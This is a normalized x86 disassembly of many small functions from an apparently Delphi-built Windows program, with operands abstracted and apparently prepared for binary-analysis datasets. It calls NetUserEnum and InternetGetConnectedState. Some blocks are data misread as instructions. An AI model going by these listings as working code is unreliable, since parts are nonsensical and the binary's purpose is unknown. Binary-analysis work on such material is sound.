add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_455ca4
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_455c54
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_455ca4
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_455c70
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_455ca4
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_455c88
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_455ca4
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_455f48
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_455f54
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_455f60
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_455f6c
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_455f78
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_455f84
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_455fc0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4167c8
pop esi
pop ebx
retn
sub_455fd4
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_455fdc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4167c8
pop esi
pop ebx
retn
sub_455ff0
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_4560cc
mov eax [ eax + 0x54 ]
call sub_416668
retn
sub_4560d8
mov eax [ eax + 0x54 ]
call sub_416964
retn
sub_45632f
jmp sub_4046f8
sub_456373
jmp sub_4046f8
sub_45637a
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4563c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4561c8
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_404e98
pop esi
pop ebx
retn
sub_456434
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_4167c8
pop esi
pop ebx
retn
sub_456448
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_45665b
jmp sub_4046f8
sub_456662
pop ebx
mov esp ebp
pop ebp
retn
sub_456668
inc [ eax + 0x8c ]
retn
sub_456670
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_456690
sub_456690
xor edx edx
call sub_456b0c
retn
sub_456afe
jmp sub_4046f8
sub_456b85
jmp sub_4046f8
sub_456b94
add eax 0x30
call sub_40f8bc
retn
sub_456bd8
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x8d ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_456c29
jmp sub_404444
sub_456c2e
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_4589e0
call sub_404854
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_456e7c
call sub_456e44
mov eax [ rw-data ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_451b7c
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457425
jmp sub_4046f8
sub_45742c
pop ebx
mov esp ebp
pop ebp
retn
sub_4575b4
push ebx
inc [ eax + 0xc4 ]
cmp [ eax + 0xc4 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0x10a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_4575e0
push ebx
dec [ eax + 0xc4 ]
cmp [ eax + 0xc4 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x112 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_45760c
xor edx edx
call sub_457504
retn
sub_457614
mov dl 0x1
call sub_457504
retn
sub_457810
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_457828
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_4578f5
jmp sub_4046f8
sub_4578fc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458056
jmp sub_404444
sub_4587ec
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_458842
jmp sub_404444
sub_458929
jmp sub_404444
sub_458962
jmp sub_4046f8
sub_458969
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458970
call sub_40f3e0
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_458bd8
jmp sub_4046f8
sub_458bdf
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_458ca7
jmp sub_4046f8
sub_458cae
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458f32
jmp sub_4046f8
sub_458f39
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_458fbb
jmp sub_4046f8
sub_458fc2
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_458fcc
call sub_458cc4
retn
sub_459101
jmp sub_404444
sub_459106
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_4589e0
call sub_404854
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_459218
jmp sub_404444
sub_459271
jmp sub_4046f8
sub_459278
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4593a5
jmp sub_4046f8
sub_459498
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
cmp [ ebx + 0x4c ] 0x0
setne al
pop ebx
retn
lea eax [ ebx + 0x4c ]
call sub_406af4
call sub_41f344
sub_4594fc
push ebx
mov ebx eax
movzx eax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_45983d
jmp sub_4046f8
sub_45986c
jmp sub_4046f8
sub_45997e
jmp sub_4046f8
sub_459985
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_459d17
jmp sub_4046f8
sub_459d1e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459f9c
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_459fe7
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_459ff8
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_45a008
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_45a0e7
jmp sub_4046f8
sub_45a0ee
pop ebp
retn
sub_45a160
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_45bea0
push ebx
mov ebx edx
mov edx ebx
call sub_45a168
mov eax ebx
call sub_45bbb4
pop ebx
retn
sub_45d941
jmp sub_4046f8
sub_45d948
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45dac8
jmp sub_4046f8
sub_45dacf
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45df44
jmp sub_4046f8
sub_45df4b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e034
jmp sub_4046f8
sub_45e03b
pop ebx
mov esp ebp
pop ebp
retn
sub_45e050
push ecx
mov [ esp ] 0x7
push 0x0
lea eax [ esp + 0x4 ]
push eax
call InternetGetConnectedState
cmp eax 0x1
sbb eax eax
inc eax
pop edx
retn
sub_45e10f
jmp sub_404444
sub_45e14e
jmp sub_4046f8
sub_45e155
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e1d1
jmp sub_4046f8
sub_45e1d8
pop ebx
mov esp ebp
pop ebp
retn
sub_45e2a5
jmp sub_404444
sub_45e2df
jmp sub_4046f8
sub_45e2e6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e441
jmp sub_4046f8
sub_45e448
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e4de
jmp sub_404444
sub_45e588
jmp sub_4046f8
sub_45e58f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e59b
jmp [ esi ]
sub_45e851
jmp sub_4046f8
sub_45e858
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e91b
jmp sub_4046f8
sub_45e922
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45ea64
jmp sub_4046f8
sub_45ea6b
pop ebx
mov esp ebp
pop ebp
retn
sub_45ebd6
jmp sub_4046f8
sub_45ebdd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ec75
jmp sub_4046f8
sub_45ec7c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45ed38
jmp sub_4046f8
sub_45ed3f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ee4e
jmp sub_4046f8
sub_45ee55
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ee77
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
sub_45ee70
jmp sub_4046f8
sub_45ee77
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ef9b
jmp sub_4046f8
sub_45efa2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45efcc
lea eax [ ebp - 0x3c ]
call sub_404e44
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
sub_45efc5
jmp sub_4046f8
sub_45efcc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f047
jmp sub_4046f8
sub_45f04e
pop ebp
retn
sub_45f13b
jmp sub_4046f8
sub_45f142
mov esp ebp
pop ebp
retn
sub_45f2c5
jmp sub_404444
sub_45f3ad
jmp sub_404444
sub_45f574
jmp sub_404444
sub_45f59f
jmp sub_404444
sub_45f5cc
jmp sub_404444
sub_45f618
jmp sub_4046f8
sub_45f61f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f8b4
jmp sub_404444
sub_45f9f3
jmp sub_404444
sub_45faea
jmp sub_4046f8
sub_45faf1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45fbc8
retn
sub_45fbc9
jmp sub_4046f8
j_sub_45fbc8
jmp sub_45fbc8
sub_45fbd0
pop ebp
retn
NetUserEnum
jmp [ NetUserEnum@IAT ]
NetApiBufferFree
jmp [ NetApiBufferFree@IAT ]
sub_45fc58
jmp sub_404444
sub_45fcab
jmp sub_4046f8
sub_45fcb2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45fcbf
[ edx ]
sub_45fe0e
jmp sub_404444
sub_45fe97
jmp sub_4046f8
sub_45fe9e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ffc5
jmp sub_404444
sub_45fffb
jmp sub_404444
sub_4602a3
jmp sub_4046f8
sub_4602de
jmp sub_4046f8
sub_4602e5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46032f
jmp [ eax ]
sub_46056b
[ eax + eax ]
sub_4605a3
jmp [ eax + eax ]
sub_4606f4
jmp sub_404444
sub_46071c
jmp sub_4046f8
sub_460723
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4607da
jmp sub_404444
sub_4607ff
jmp sub_4046f8
sub_460806
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_460873
jmp sub_404444
sub_4609ff
jmp sub_404444
sub_460cdb
jmp sub_404444
sub_460d00
jmp sub_4046f8
sub_460d07
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460e00
jmp sub_404444
sub_460ed3
jmp sub_404444
sub_460efd
jmp sub_4046f8
sub_460f04
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46120a
jmp sub_404444
sub_46124f
jmp sub_4046f8
sub_461256
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4613ed
jmp sub_404444
sub_461517
jmp sub_404444
sub_461588
jmp sub_404444
sub_461603
jmp sub_404444
sub_4617ea
jmp sub_404444
sub_46180f
jmp sub_4046f8
sub_461816
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461a9b
jmp sub_404444
sub_461ac8
jmp sub_4046f8
sub_461acf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461b0b
jmp [ esi ]
sub_461b7b
[ eax ]
sub_461d52
jmp sub_404444
sub_461d7a
jmp sub_4046f8
sub_461d81
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461e30
jmp sub_404444
sub_461e7f
jmp sub_4046f8
sub_461e86
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_461eeb
jmp sub_4046f8
sub_461ef2
pop ebp
retn
sub_4624e0
mov eax edx
call sub_409df4
retn
sub_462551
jmp sub_4046f8
sub_462558
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_462568
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx esi
mov eax ebx
call sub_40e888
pop esi
pop ebx
retn
sub_462598
push ebp
mov ebp esp
push ebx
mov ebx edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_409968
pop ebx
pop ebp
retn 0x8
sub_4625c4
mov eax edx
mov edx ecx
call sub_40a0a4
retn
sub_4625d0
push esi
push edi
mov eax [ rw-data ]
mov esi eax
mov edi edx
mov ecx 0x8
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_462659
jmp sub_4046f8
sub_462660
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4626b2
jmp sub_4046f8
sub_4626b9
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4626ec
add esp 0xfffffff8
call sub_40be08
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_462720
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40bde0
pop ebp
retn 0x8
sub_462734
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax edx
mov edx ecx
mov ecx [ ebp + 0x8 ]
call sub_40bdc0
pop ebp
retn 0xc
sub_4627ac
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx esi
mov eax ebx
call sub_4094b4
pop esi
pop ebx
retn
sub_4627c0
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx esi
mov eax ebx
call sub_40a164
pop esi
pop ebx
retn
sub_4627d4
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx esi
mov eax ebx
call sub_4090e4
pop esi
pop ebx
retn
sub_46283d
jmp sub_4046f8
sub_462844
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_462854
mov eax edx
mov edx ecx
call sub_4092e0
retn
sub_462a2b
jmp sub_4046f8
sub_462a32
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_462ad1
jmp sub_4046f8
sub_462ad8
pop ebp
retn
sub_462b38
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx esi
mov eax ebx
call sub_40933c
pop esi
pop ebx
retn
sub_462b4c
mov eax edx
mov edx ecx
call sub_409374
retn
sub_462b58
mov eax edx
mov edx ecx
call sub_40e924
retn
sub_462b65
out 0x4a eax
add [ ebx ] dl
inc [ eax ]
add ah dh
out 0x4a eax
add [ edi + edi * 8 ] dl
add [ eax ] al
hlt
sub_46322d
jmp sub_4046f8
sub_463234
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_463250
test edx edx
je r-xdata
retn
mov edx ecx
call sub_463298
sub_46325c
test dl dl
jne r-xdata
retn
mov edx ecx
call sub_463298
sub_463268
test edx edx
jne r-xdata
retn
mov edx ecx
call sub_463298
sub_463274
push ebp
mov ebp esp
cmp ecx edx
jg r-xdata
mov edx [ ebp + 0x8 ]
call sub_463298
cmp edx [ ebp + 0xc ]
jle r-xdata
pop ebp
retn 0x8
sub_4634c7
jmp sub_4046f8
sub_4634ce
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4634dc
mov eax [ rw-data ]
mov eax [ eax ]
retn
sub_4639e5
jmp sub_4046f8
sub_4639ec
mov eax esi
mov edi [ ebp - 0x14 ]
mov esi [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
mov esp ebp
pop ebp
retn 0x4
sub_463c83
jmp sub_4046f8
sub_463c8a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_463d44
cmp al 0x30
jb r-xdata
xor eax eax
retn
cmp al 0x37
jbe r-xdata
mov al 0x1
retn
sub_463e04
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_406030
cmp [ esp ] 0x0
sete al
add esp 0x10
pop ebx
retn
sub_463e98
jmp sub_4046f8
sub_463e9f
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46449e
jmp sub_4046f8
sub_4644a5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4645c5
jmp sub_4046f8
sub_4645cc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46466c
call sub_405468
retn
sub_464674
mov ecx edx
mov edx [ r-xdata ]
xchg edx eax
call sub_462b58
retn
sub_4646de
jmp sub_404444
sub_46495c
xor ecx ecx
mov eax [ eax ]
test eax eax
je r-xdata
call sub_403e2c
cmp ecx [ eax - 0x4 ]
jb r-xdata
add eax ecx
mov [ eax ] edx
retn
sub_464974
test eax eax
je r-xdata
call sub_403e2c
cmp edx [ eax - 0x4 ]
jb r-xdata
movzx eax [ eax + edx ]
retn
sub_464988
test eax eax
je r-xdata
call sub_403e2c
cmp edx [ eax - 0x4 ]
jb r-xdata
add eax edx
mov eax [ eax ]
retn
sub_4649c8
test eax eax
je r-xdata
call sub_403e2c
cmp edx [ eax - 0x4 ]
jb r-xdata
add eax edx
movzx eax [ eax ]
retn
sub_4649dc
test eax eax
je r-xdata
call sub_403e2c
cmp edx [ eax - 0x4 ]
jb r-xdata
add eax edx
mov edx ecx
mov ecx 0x10
call sub_402f9c
retn
sub_464ada
jmp sub_4046f8
sub_464ae1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_464b62
jmp sub_4046f8
sub_464b69
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464b70
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x28 ]
pop ebx
retn
sub_464c0c
jmp sub_4046f8
sub_464c13
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_464c77
jmp sub_4046f8
sub_464c7e
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464db9
jmp sub_4046f8
sub_464dc0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464dcb
jmp [ eax ]
sub_464e2a
jmp sub_4046f8
sub_464e31
pop ebp
retn
sub_4650ac
retn
sub_4650b0
test [ eax + 0x1c ] 0x10
setne al
retn
sub_4689a7
[ 0x45000000 ]
sub_4689fb
[ ebx ]
sub_469180
retn
sub_469181
jmp sub_4046f8
j_sub_469180
jmp sub_469180
sub_469188
pop ebp
retn
sub_4692ac
jmp sub_4046f8
sub_46937a
jmp sub_4046f8
sub_469381
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469388
mov edx rw-data
mov eax r-xdata
call sub_4692e4
call [ rw-data ]
retn
sub_469587
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x4
sub_4695b6
add [ eax ] al
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
movzx eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x4
sub_4695ea
add [ eax ] al
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x4
sub_46961e
add [ eax ] al
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
push [ ebp + 0x8 ]
call [ rw-data ]
pop ebp
retn 0x4
sub_469687
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x4
sub_469873
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x8
sub_469a45
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x4
sub_469ab8
mov edx rw-data
mov eax r-xdata
call sub_4692e4
call [ rw-data ]
retn
sub_469b8b
add [ edx + rw-data ] bh
mov eax r-xdata
call sub_4692e4
call [ rw-data ]
retn
sub_469e3b
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x8
sub_46b549
jmp sub_4046f8
sub_46b550
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46b5a0
xor edx edx
mov [ eax ] edx
retn
sub_46b600
add eax 0x4
jae r-xdata
sub eax 0x1
jae r-xdata
call sub_403e34
and eax 0xfffffffc
retn
call sub_403e34
sub_46b618
xor edx edx
cmp [ eax + 0x10 ] 0xc
jb r-xdata
mov eax edx
retn
mov edx [ eax + 0x14 ]
sub_46b6d9
jmp sub_4046f8
sub_46b6e0
pop ebp
retn
sub_46b8a8
jmp sub_4046f8
sub_46b8af
pop ebp
retn
sub_46bd8e
jmp sub_4046f8
sub_46bd95
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46bf09
jmp sub_4046f8
sub_46bf10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46bf28
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
mov edx eax
mov eax ebx
call sub_46bff4
pop ebx
retn
sub_46c07f
jmp sub_4046f8
sub_46c086
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46c48c
jmp sub_4046f8
sub_46c493
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c4e6
jmp sub_4046f8
sub_46c4ed
pop ecx
pop ebp
retn
sub_46c96e
inc esi
add [ edi + ebx * 8 - 0x316fffba ] ah
inc esi
add [ ebp + edx * 8 - 0x29a3ffba ] bl
inc esi
add [ edx + edx * 8 ] dl
inc esi
add [ eax - 0x35 ] cl
inc esi
add ah bl

sub_46cbc9
jmp sub_4046f8
sub_46cbd0
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46ccd4
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46ce59
jmp sub_4046f8
sub_46ce7d
jmp sub_4046f8
sub_46ce84
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46d00d
jmp sub_4046f8
sub_46d014
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_46d1cf
jmp sub_4046f8
sub_46d1d6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_46d238
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
j_sub_404570#7
jmp sub_404570
sub_46d352
jmp sub_4046f8
sub_46d359
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d47b
jmp sub_404444
sub_46d4bb
jmp sub_4046f8
sub_46d4c2
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d4cc
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46d4d8
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46d4e4
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46d4f0
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46d64e
jmp sub_4046f8
sub_46d655
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46d711
jmp sub_4046f8
sub_46d718
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d735
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_46d72e
jmp sub_4046f8
sub_46d735
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_46d740
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46d831
jmp sub_4046f8
sub_46d838
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46d912
jmp sub_4046f8
sub_46d919
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d936
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
sub_46d92f
jmp sub_4046f8
sub_46d936
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46d97a
jmp sub_4046f8
sub_46d981
pop ecx
pop ebp
retn
sub_46d9cc
jmp sub_4046f8
sub_46d9d3
movzx eax [ ebp - 0x5 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46da1a
jmp sub_4046f8
sub_46da21
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_46dabb
jmp sub_4046f8
sub_46dac2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dadf
lea eax [ ebp - 0xc ]
call sub_404e44
retn
sub_46dad8
jmp sub_4046f8
sub_46dadf
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_46dba0
jmp sub_4046f8
sub_46dba7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46dc4f
jmp sub_4046f8
sub_46dc56
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46de8b
jmp sub_4046f8
sub_46de92
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46dedf
jmp sub_4046f8
sub_46dee6
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46df6e
jmp sub_4046f8
sub_46df75
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_46e0e2
jmp sub_4046f8
sub_46e106
jmp sub_4046f8
sub_46e10d
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46e2cd
jmp sub_4046f8
sub_46e2d4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46e40d
jmp sub_4046f8
sub_46e414
movzx eax [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_46e420
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x4
sub_46e549
jmp sub_4046f8
sub_46e550
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_46e76d
jmp sub_4046f8
sub_46e774
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_46ea55
jmp sub_4046f8
sub_46ea5c
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46eae1
jmp sub_4046f8
sub_46eae8
pop ebp
retn
sub_46ed2b
jmp sub_4046f8
sub_46ed32
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_46ed7c
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x4 ]
retn
sub_46edbc
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx ]
retn
sub_46edc4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_46edd0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_46ef54
jmp sub_4046f8
sub_46ef5b
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
